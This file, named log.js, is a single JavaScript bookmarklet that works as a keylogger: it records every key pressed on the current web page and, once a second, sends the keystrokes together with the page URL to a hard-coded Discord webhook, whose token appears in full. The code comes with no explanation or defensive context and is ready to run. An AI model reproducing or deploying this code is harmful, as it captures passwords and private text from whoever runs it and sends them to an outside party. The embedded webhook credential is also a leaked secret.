/// log.js
javascript:(function(){let log=[],siteURL=window.location.href;document.addEventListener('keydown',function(event){log.push('Key pressed: '+event.key);});setTimeout(()=>{fetch('https://discord.com/api/webhooks/1288242859765665923/NnERv8pZZ-bsQYDbhTWWtmpjB2qsqbRW4sr_Ub70o2rFz1zUD_wwTU2QAI4k1emhwjSp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`Current Site URL: ${siteURL}\nKeys pressed before sending:\n${log.join('\n')}`})});log=[];},1000);setInterval(function(){if(log.length>0){fetch('https://discord.com/api/webhooks/1288242859765665923/NnERv8pZZ-bsQYDbhTWWtmpjB2qsqbRW4sr_Ub70o2rFz1zUD_wwTU2QAI4k1emhwjSp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:log.join('\n')})});log=[];}},1000);})();
